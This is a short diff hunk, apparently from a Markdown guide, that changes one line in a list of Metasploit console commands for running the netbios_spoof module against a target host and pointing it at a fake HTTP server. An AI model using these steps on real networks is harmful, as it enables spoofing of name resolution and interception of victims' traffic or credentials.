@@ -103,7 +103,7 @@ Step 4: Start the third Metasploit instance:
 
 1. ```rvmsudo ./msfconsole -q```
 2. ```use auxiliary/admin/netbios/netbios_spoof```
-3. ```set NBADDR [IP to fake HTTP auth server]```
+3. ```set NBADDR [IP to fake HTTP server]```
 4. ```set PPSRATE 30000```
 5. ```set RHOST [Target Host]```
 6. ```run```
